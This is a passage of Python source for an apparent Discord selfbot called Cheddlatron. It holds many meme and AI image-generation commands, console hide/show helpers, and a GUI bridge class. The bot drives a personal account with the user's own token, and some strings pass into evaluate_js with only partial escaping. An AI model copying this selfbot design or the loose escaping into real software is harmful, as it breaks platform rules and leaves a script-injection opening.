    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/michael-scott/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a mini Keanu meme. \nUsage: {config_get('prefix')}minikeanu [text 1] [text 2]", help="meme")
async def minikeanu(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/mini-keanu/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a mini Keanu meme. \nUsage: {config_get('prefix')}minikeanu [text 1] [text 2]", help="meme")
async def takemymoney(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/money/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a computer dog meme. \nUsage: {config_get('prefix')}computerdog [text 1] [text 2]", help="meme")
async def computerdog(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/noidea/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a psycho girl meme. \nUsage: {config_get('prefix')}psychogirl [text 1] [text 2]", help="meme")
async def psychogirl(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/oag/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a why monkey meme. \nUsage: {config_get('prefix')}whymonkey [text 1] [text 2]", help="meme")
async def whymonkey(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/persian/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a Philosoraptor meme. \nUsage: {config_get('prefix')}philosoraptor [text 1] [text 2]", help="meme")
async def philosoraptor(ctx, text1: str=None, text2: str=None):   
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/philosoraptor/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a smart man meme. \nUsage: {config_get('prefix')}smart [text 1] [text 2]", help="meme")
async def smart(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/rollsafe/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a sad Joe Biden meme. \nUsage: {config_get('prefix')}sadbiden [text 1] [text 2]", help="meme")
async def sadbiden(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/sad-biden/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a sad Obama meme. \nUsage: {config_get('prefix')}sadobama [text 1] [text 2]", help="meme")
async def sadobama(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/sad-obama/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a sad Pepe meme. \nUsage: {config_get('prefix')}sadpepe [text 1] [text 2]", help="meme")
async def sadpepe(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/sadfrog/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a salty meme. \nUsage: {config_get('prefix')}salty [text 1] [text 2]", help="meme")
async def salty(ctx, text1: str=None, text2: str=None):   
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/saltbae/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a suspicious snake meme. \nUsage: {config_get('prefix')}sussnake [text 1] [text 2]", help="meme")
async def willslap(ctx, text1: str=None, text2: str=None):   
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/slap/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a suspicious snake meme. \nUsage: {config_get('prefix')}sussnake [text 1] [text 2]", help="meme")
async def sussnake(ctx, text1: str=None, text2: str=None):   
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/snek/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a happy seal meme. \nUsage: {config_get('prefix')}happyseal [text 1] [text 2]", help="meme")
async def happyseal(ctx, text1: str=None, text2: str=None):   
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/soa/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a Sparta meme. \nUsage: {config_get('prefix')}sparta [text 1] [text 2]", help="meme")
async def sparta(ctx, text1: str=None, text2: str=None):   
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/sparta/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a Spiderman pointing meme. \nUsage: {config_get('prefix')}spiderpoint [text 1] [text 2]", help="meme")
async def spiderpoint(ctx, text1: str=None, text2: str=None):   
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/spiderman/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a stupid SpongeBob meme. \nUsage: {config_get('prefix')}stupidsponge [text 1] [text 2]", help="meme")
async def stupidsponge(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/spongebob/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a stonks meme. \nUsage: {config_get('prefix')}stonks [text 1] [text 2]", help="meme")
async def stonks(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/stonks/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a 'stop it get some help' meme. \nUsage: {config_get('prefix')}getsomehelp [text 1] [text 2]", help="meme")
async def getsomehelp(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/stop-it/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a success kid meme. \nUsage: {config_get('prefix')}successkid [text 1] [text 2]", help="meme")
async def successkid(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/success/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a Donald Trump meme. \nUsage: {config_get('prefix')}trump [text 1] [text 2]", help="meme")
async def trump(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/trump/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a Ugandaknuckles meme. \nUsage: {config_get('prefix')}ugandaknuckles [text 1] [text 2]", help="meme")
async def ugandaknuckles(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/ugandanknuck/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates a Willy Wonka meme. \nUsage: {config_get('prefix')}wonka [text 1] [text 2]", help="meme")
async def wonka(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/wonka/{text1}/{text2}.png"))

@Cheddlatron.command(description=f"Creates an angry Redditor meme. \nUsage: {config_get('prefix')}angryredditor [text 1] [text 2]", help="meme")
async def angryredditor(ctx, text1: str=None, text2: str=None):    
    if text1 == None or text1 == "":
        text1 = "-"
    elif text2 == None or text2 == "":
        text2 = "-"
    await ctx.send(urlif(f"https://api.memegen.link/images/yuno/{text1}/{text2}.png"))
#MEME COMMANDS------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#AI IMG GEN--------------------------------------------------------------------------------------------------------------------
@Cheddlatron.command(description=f"Generates an image with 3Guofeng3_v34 AI. \nUsage: {config_get('prefix')}guofeng3 <prompt> [negative] [seed]", help="ai")    
async def guofeng3(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="3Guofeng3_v34.safetensors [50f420de]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Absolute Reality AI. \nUsage: {config_get('prefix')}absolutereality <prompt> [negative] [seed]", help="ai")    
async def absolutereality(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="absolutereality_v181.safetensors [3d9d4d2b]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Am I Real AI. \nUsage: {config_get('prefix')}amireal <prompt> [negative] [seed]", help="ai")    
async def amireal(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="amIReal_V41.safetensors [0a8a2e61]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Analog AI. \nUsage: {config_get('prefix')}analog <prompt> [negative] [seed]", help="ai")    
async def analog(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="analog-diffusion-1.0.ckpt [9ca13f02]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Anything AI. \nUsage: {config_get('prefix')}anything <prompt> [negative] [seed]", help="ai")    
async def anything(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="anythingV5_PrtRE.safetensors [893e49b9]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Abyss Orange Mix AI. \nUsage: {config_get('prefix')}abyssorangemix <prompt> [negative] [seed]", help="ai")    
async def abyssorangemix(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="AOM3A3_orangemixs.safetensors [9600da17]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Blazing Drive AI. \nUsage: {config_get('prefix')}blazingdrive <prompt> [negative] [seed]", help="ai")    
async def blazingdrive(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="blazing_drive_v10g.safetensors [ca1c1eab]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Break Domain AI. \nUsage: {config_get('prefix')}breakdomain <prompt> [negative] [seed]", help="ai")    
async def breakdomain(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="breakdomain_M2150.safetensors [15f7afca]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with CetusMix AI. \nUsage: {config_get('prefix')}cetusmix <prompt> [negative] [seed]", help="ai")    
async def cetusmix(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="cetusMix_Version35.safetensors [de2f2560]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Chidlren's Stories 3D AI. \nUsage: {config_get('prefix')}stories3d <prompt> [negative] [seed]", help="ai")    
async def stories3d(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="childrensStories_v13D.safetensors [9dfaabcb]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Chidlren's Stories Semi-Real AI. \nUsage: {config_get('prefix')}storiessemi <prompt> [negative] [seed]", help="ai")    
async def storiessemi(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="childrensStories_v1SemiReal.safetensors [a1c56dbb]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Chidlren's Stories Anime AI. \nUsage: {config_get('prefix')}storiessemi <prompt> [negative] [seed]", help="ai")    
async def storiesanime(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="childrensStories_v1ToonAnime.safetensors [2ec7b88b]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Counterfeit AI. \nUsage: {config_get('prefix')}counterfeit <prompt> [negative] [seed]", help="ai")    
async def counterfeit(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="Counterfeit_v30.safetensors [9e2a8f19]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with CuteYukimix AI. \nUsage: {config_get('prefix')}cuteyukimix <prompt> [negative] [seed]", help="ai")    
async def cuteyukimix(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="cuteyukimixAdorable_midchapter3.safetensors [04bdffe6]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Cyber Realistic AI. \nUsage: {config_get('prefix')}cyberrealistic <prompt> [negative] [seed]", help="ai")    
async def cyberrealistic(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="cyberrealistic_v33.safetensors [82b0d085]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Dalcefo AI. \nUsage: {config_get('prefix')}dalcefo <prompt> [negative] [seed]", help="ai")    
async def dalcefo(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="dalcefo_v4.safetensors [425952fe]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Deliberate AI. \nUsage: {config_get('prefix')}deliberate <prompt> [negative] [seed]", help="ai")    
async def deliberate(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="deliberate_v3.safetensors [afd9d2d4]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Dreamlike Anime AI. \nUsage: {config_get('prefix')}dreamlikeanime <prompt> [negative] [seed]", help="ai")    
async def dreamlikeanime(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="dreamlike-anime-1.0.safetensors [4520e090]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Dreamlike Diffusion AI. \nUsage: {config_get('prefix')}dreamlikediffusion <prompt> [negative] [seed]", help="ai")    
async def dreamlikediffusion(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="dreamlike-diffusion-1.0.safetensors [5c9fd6e0]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Dreamlike Photoreal AI. \nUsage: {config_get('prefix')}dreamlikephotoreal <prompt> [negative] [seed]", help="ai")    
async def dreamlikephotoreal(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="dreamlike-photoreal-2.0.safetensors [fdcf65e7]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Dreamshaper AI. \nUsage: {config_get('prefix')}dreamshaper <prompt> [negative] [seed]", help="ai")    
async def dreamshaper(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="dreamshaper_8.safetensors [9d40847d]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Edge of Realism AI. \nUsage: {config_get('prefix')}eor <prompt> [negative] [seed]", help="ai")    
async def eor(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="edgeOfRealism_eorV20.safetensors [3ed5de15]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Anime Diffusion AI. \nUsage: {config_get('prefix')}animediffusion <prompt> [negative] [seed]", help="ai")    
async def animediffusion(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="EimisAnimeDiffusion_V1.ckpt [4f828a15]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Elldreth's Vivid AI. \nUsage: {config_get('prefix')}vivid <prompt> [negative] [seed]", help="ai")    
async def vivid(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="elldreths-vivid-mix.safetensors [342d9d26]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with PhotoGasm AI. \nUsage: {config_get('prefix')}photogasm <prompt> [negative] [seed]", help="ai")    
async def photogasm(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="epicphotogasm_xPlusPlus.safetensors [1a8f6d35]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with EpiCRealism AI. \nUsage: {config_get('prefix')}epicrealism <prompt> [negative] [seed]", help="ai")    
async def epicrealism(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="epicrealism_naturalSinRC1VAE.safetensors [90a4c676]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with EpiCRealism Pure Evolution AI. \nUsage: {config_get('prefix')}erpure <prompt> [negative] [seed]", help="ai")    
async def erpure(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="epicrealism_pureEvolutionV3.safetensors [42c8440c]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Seco AI. \nUsage: {config_get('prefix')}seco <prompt> [negative] [seed]", help="ai")    
async def seco(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="ICantBelieveItsNotPhotography_seco.safetensors [4e7a3dfd]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Indigo AI. \nUsage: {config_get('prefix')}indigo <prompt> [negative] [seed]", help="ai")    
async def indigo(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="indigoFurryMix_v75Hybrid.safetensors [91208cbb]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Juggernaut AI. \nUsage: {config_get('prefix')}juggernaut <prompt> [negative] [seed]", help="ai")    
async def juggernaut(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="juggernaut_aftermath.safetensors [5e20c455]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Lofi AI. \nUsage: {config_get('prefix')}lofi <prompt> [negative] [seed]", help="ai")    
async def lofi(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="lofi_v4.safetensors [ccc204d6]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Lyriel AI. \nUsage: {config_get('prefix')}lyriel <prompt> [negative] [seed]", help="ai")    
async def lyriel(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="lyriel_v16.safetensors [68fceea2]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with MajicMix AI. \nUsage: {config_get('prefix')}majicmix <prompt> [negative] [seed]", help="ai")    
async def majicmix(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="majicmixRealistic_v4.safetensors [29d0de58]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with MechaMix AI. \nUsage: {config_get('prefix')}mechamix <prompt> [negative] [seed]", help="ai")    
async def mechamix(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="mechamix_v10.safetensors [ee685731]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with MeinaMix AI. \nUsage: {config_get('prefix')}meinamix <prompt> [negative] [seed]", help="ai")    
async def meinamix(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="meinamix_meinaV11.safetensors [b56ce717]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Neverending Dream AI. \nUsage: {config_get('prefix')}neverendingdream <prompt> [negative] [seed]", help="ai")    
async def neverendingdream(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="neverendingDream_v122.safetensors [f964ceeb]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Openjourney AI. \nUsage: {config_get('prefix')}openjourney <prompt> [negative] [seed]", help="ai")    
async def openjourney(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="openjourney_V4.ckpt [ca2f377f]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Pastek-Mix AI. \nUsage: {config_get('prefix')}pastelmix <prompt> [negative] [seed]", help="ai")    
async def pastelmix(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="pastelMixStylizedAnime_pruned_fp16.safetensors [793a26e8]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Portrait AI. \nUsage: {config_get('prefix')}portrait <prompt> [negative] [seed]", help="ai")    
async def portrait(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="portraitplus_V1.0.safetensors [1400e684]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Protogen AI. \nUsage: {config_get('prefix')}protogen <prompt> [negative] [seed]", help="ai")    
async def protogen(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="protogenx34.safetensors [5896f8d5]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Realistic Vision AI. \nUsage: {config_get('prefix')}realisticvision <prompt> [negative] [seed]", help="ai")    
async def realisticvision(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="Realistic_Vision_V5.0.safetensors [614d1063]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with ReV Animated AI. \nUsage: {config_get('prefix')}rev <prompt> [negative] [seed]", help="ai")    
async def rev(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="revAnimated_v122.safetensors [3f4fefd9]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with RunDiffusion AI. \nUsage: {config_get('prefix')}rundiffusion <prompt> [negative] [seed]", help="ai")    
async def rundiffusion(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="rundiffusionFX25D_v10.safetensors [cd12b0ee]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with RunDiffusion Photorealistic AI. \nUsage: {config_get('prefix')}rdrealistic <prompt> [negative] [seed]", help="ai")    
async def rdrealistic(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="rundiffusionFX_v10.safetensors [cd4e694d]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with SD AI. \nUsage: {config_get('prefix')}sd <prompt> [negative] [seed]", help="ai")    
async def sd(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="v1-5-pruned-emaonly.safetensors [d7049739]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with SD Inpainting AI. \nUsage: {config_get('prefix')}sdinpainting <prompt> [negative] [seed]", help="ai")    
async def sdinpainting(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="v1-5-inpainting.safetensors [21c7ab71]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Shonin's Beautiful People AI. \nUsage: {config_get('prefix')}shonin <prompt> [negative] [seed]", help="ai")    
async def shonin(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="shoninsBeautiful_v10.safetensors [25d8c546]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with TheAlly's Mix AI. \nUsage: {config_get('prefix')}theallysmix <prompt> [negative] [seed]", help="ai")    
async def theallysmix(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="theallys-mix-ii-churned.safetensors [5d9225a4]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with Timeless AI. \nUsage: {config_get('prefix')}timeless <prompt> [negative] [seed]", help="ai")    
async def timeless(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="timeless-1.0.ckpt [7c4971d4]", negative=negative, seed=seed)

@Cheddlatron.command(description=f"Generates an image with ToonYou AI. \nUsage: {config_get('prefix')}toonyou <prompt> [negative] [seed]", help="ai")    
async def toonyou(ctx, prompt: str, negative: str="", seed=None):
    await aigen(ctx, prompt, model="toonyou_beta6.safetensors [980f6b15]", negative=negative, seed=seed)

def hide_console():
    if platform.system() == 'Windows':
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    elif platform.system() == 'Darwin': 
        subprocess.call(['osascript', '-e', 'tell application "Terminal" to quit'])
    else:  
        subprocess.call(['wmctrl', '-r', ':ACTIVE:', '-b', 'hidden'])

def show_console():
    if platform.system() == 'Windows':
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 1)
    elif platform.system() == 'Darwin': 
        subprocess.call(['open', '-a', 'Terminal'])
    else: 
        subprocess.call(['wmctrl', '-r', ':ACTIVE:', '-b', '!hidden'])

@Cheddlatron.command(description=f"Hides the console so only the gui is visible. \nUsage: {config_get('prefix')}hideconsole", help="utility")
async def hideconsole(ctx):
    hide_console()

@Cheddlatron.command(description=f"Shows the console. \nUsage: {config_get('prefix')}showconsole", help="utility")
async def showconsole(ctx):
    show_console()

class API:
    def open_link(self, link):
        webbrowser.open(link)

    def close_window(self):
        window.destroy()

    def minimize_window(self):
        window.minimize()

    def fullscreen_window(self):
        pass
        #window.toggle_fullscreen()

    def configedit(self, data, new_value):
        config_edit(data, new_value)
        if data == "device":
            window.destroy()
            API.restart(self)

    def get_badges(self):
        resp = requesters.get("https://discord.com/api/v9/users/@me", headers={"Authorization": config_get('token'), "x-super-properties": getxsuper()}).json()
        id = resp['id']
        badges = []
        resp = requesters.get(f'https://api.obamabot.me/v2/text/badges?user={id}').json()
        externalbadges = extract_urls(resp)
        badges.extend(externalbadges)
        headers = {"Authorization": config_get('token'), "x-super-properties": getxsuper()}
        resp = requesters.get(f'https://discord.com/api/v9/users/{id}/profile', headers=headers).json()        
        for badge in resp.get('badges', []):
            icon_url = f"https://cdn.discordapp.com/badge-icons/{badge['icon']}.png"
            badges.append(icon_url)
        return badges
    
    def print(self, message):
        message = str(message)
        message = message.replace('"', r'\"').replace('\n', '\\n')
        window.evaluate_js(f'print("{message}")')

    def printcenter(self, message):
        message = str(message)
        message = message.replace('"', r'\"').replace('\n', '\\n')
        window.evaluate_js(f'printCenter("{message}")')

    def cls(self):
        window.evaluate_js('cls()')

    def printmax(self, char):
        window.evaluate_js(f'printmax("{char}")')

    def printascii(self, ascii):
        ascii = str(ascii)
        ascii = ascii.replace('"', r'\"').replace('\n', '\\n')
        window.evaluate_js(f'printascii("{ascii}")')

    def updatenums(guildnum, friendnum):
        window.evaluate_js(f'document.getElementById("guildnum").innerText = "{guildnum}"')
        window.evaluate_js(f'document.getElementById("friendnum").innerText = "{friendnum}"')
        window.evaluate_js(f"updateProgressBars({friendnum}, {guildnum});")
    
    def restart(self):
        try:
            os_name = platform.system()
            if os_name == 'Windows':
                os.startfile("Cheddlatron.exe")
                os._exit(1)
            elif os_name in ['Darwin', 'Linux']:
                os.system("./Cheddlatron.bin")
            else:
                raise NotImplementedError("Unsupported operating system")
            os._exit(1)
        except (FileNotFoundError, NotImplementedError):
            os.system("python Cheddlatron.py")
            os._exit(1)
        except Exception as e:
            pass

    def get_file_names(self):
        directory = os.path.join(os.getcwd(), 'Data', 'Themes')
        try:
            return [f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]
        except FileNotFoundError:
            return []

    def get_etheme_names(self):
        directory = os.path.join(os.getcwd(), 'Data', 'Settings', 'Configs', 'Ethemes')
        try:
            return [f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]
        except FileNotFoundError:
            return []

    def get_etheme_names(self):
        directory = os.path.join(os.getcwd(), 'Data', 'Settings', 'Configs', 'Ethemes')
        try:
            files = [f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]
            return [os.path.splitext(os.path.basename(file))[0] 
                    for file in files]
        except FileNotFoundError:
            return []

    def getetheme(self, name):
        directory = os.path.join(os.getcwd(), 'Data', 'Settings', 'Configs', 'Ethemes')
        try:
            files = [f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]
            for file in files:
                if os.path.splitext(os.path.basename(file))[0] == name:
                    with open(os.path.join(directory, file), 'r') as f:
                        return f.read()
        except FileNotFoundError:
            return None
    def loadetheme(self, theme_name):
        theme_path = f"Data/Settings/Configs/Ethemes/{theme_name}.json"
        with open(theme_path, "r") as theme_file:
            return json.load(theme_file)

    def configget(self, data):
        config_get(data)

    def terminal_ui(self):
        terminalui()

    def initialethemers(self):
        if config_get('etheme') == "":
            config_edit('etheme', 'Default')
        theme_path = f"Data/Settings/Configs/Ethemes/{config_get('etheme')}.json"
        with open(theme_path, "r") as theme_file:
            jsoni = json.load(theme_file)    
        window.evaluate_js(f"setColor('{jsoni['color']}');")
        ethemeimg = jsoni['image']
        ethemetitleurl = jsoni['title_url']
        ethemecmdurl = jsoni['cmd_url']
        window.evaluate_js(f'document.getElementById("EmbedImage").querySelector(".character-count-container textarea").value = "{ethemeimg}"')
        window.evaluate_js(f'document.getElementById("EMBEDIMGURL").src = "{ethemeimg}"')
